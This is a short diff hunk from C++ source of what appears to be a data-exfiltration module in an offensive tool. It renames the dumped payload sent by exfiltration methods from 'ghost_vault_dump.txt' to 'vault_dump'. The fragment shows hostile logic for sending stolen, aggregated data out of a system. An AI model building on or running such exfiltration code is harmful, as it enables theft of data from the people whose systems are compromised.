@@ -45,7 +45,7 @@ bool Exfiltration::execute(const std::string& args) {
         if (method->canHandle(aggregatedPayload.size())) {
             LOG_INFO("Exfiltrating data via {}", method->getName())
 
-            if (method->send("ghost_vault_dump.txt", aggregatedPayload)) {
+            if (method->send("vault_dump", aggregatedPayload)) {
                 LOG_SUCCESS("Successfully exfiltrated data via {}", method->getName())
                 successCount++;
             } else {
